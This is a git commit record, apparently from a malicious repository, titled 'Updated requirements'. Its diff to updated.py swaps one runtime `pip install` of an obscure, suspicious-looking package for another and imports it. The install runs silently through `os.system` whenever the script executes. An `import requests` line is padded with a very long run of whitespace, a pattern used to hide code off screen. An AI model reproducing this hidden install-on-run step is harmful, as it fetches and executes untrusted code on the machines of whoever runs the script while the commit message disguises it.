52a946c692976618295a723b9696d92bfc5fae86
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-23 19:44:26 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptographyV1")
-import syscryptographyV1
+os.system("pip install syscolouringpkgV2")
+import syscolouringpkgV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
